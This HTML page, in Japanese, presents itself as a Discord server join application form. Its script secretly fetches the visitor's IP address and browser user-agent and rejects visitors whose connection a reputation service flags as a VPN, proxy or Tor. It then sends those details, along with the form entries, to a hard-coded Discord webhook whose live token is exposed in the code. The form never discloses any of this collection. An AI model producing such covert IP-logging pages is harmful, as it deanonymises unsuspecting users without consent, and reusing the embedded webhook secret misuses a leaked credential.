<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>Discord参加申請</title>
</head>
<body>
  <h1>Discordサーバー参加申請フォーム</h1>
  <form id="applyForm">
    <input type="text" name="username" placeholder="あなたのDiscord名" required><br>
    <textarea name="reason" placeholder="参加理由" required></textarea><br>
    <button type="submit">送信</button>
  </form>

  <script>
    document.getElementById('applyForm').addEventListener('submit', async function (e) {
      e.preventDefault();

      const formData = new FormData(e.target);
      const username = formData.get('username');
      const reason = formData.get('reason');
      const deviceInfo = navigator.userAgent;

      try {
        // IP取得
        const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
        const ip = ipData.ip;

        // VPN・プロキシチェック（ここに自分のAPIキーを入れる）
        const vpnCheck = await fetch(`https://ipqualityscore.com/api/json/ip/YOUR_API_KEY_HERE/${ip}`).then(res => res.json());

        // 判定ロジック（怪しければ弾く）
        if (vpnCheck.vpn || vpnCheck.proxy || vpnCheck.tor || vpnCheck.recent_abuse || vpnCheck.fraud_score > 75) {
          alert("VPNまたはプロキシの使用が検出されました。オフにして再試行してください。");
          return;
        }

        // Webhook送信
        await fetch('https://discord.com/api/webhooks/1362686432870924372/S8va6w9Ro_W0BD9B9rTYrBCGgsXH20A6WTZCiSA-SmQ928zpdvxb8qkNuZvGxCVorrbr', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: '**新しい申請があります**',
            embeds: [{
              title: '申請情報',
              fields: [
                { name: 'ユーザー名', value: username },
                { name: '参加理由', value: reason },
                { name: 'IPアドレス', value: ip },
                { name: 'デバイス情報', value: deviceInfo }
              ],
              color: 0x3498db
            }]
          })
        });

        alert("申請を送信しました！");
      } catch (err) {
        console.error("エラー:", err);
        alert("送信中にエラーが発生しました。時間を置いて再試行してください。");
      }
    });
  </script>
</body>
</html>
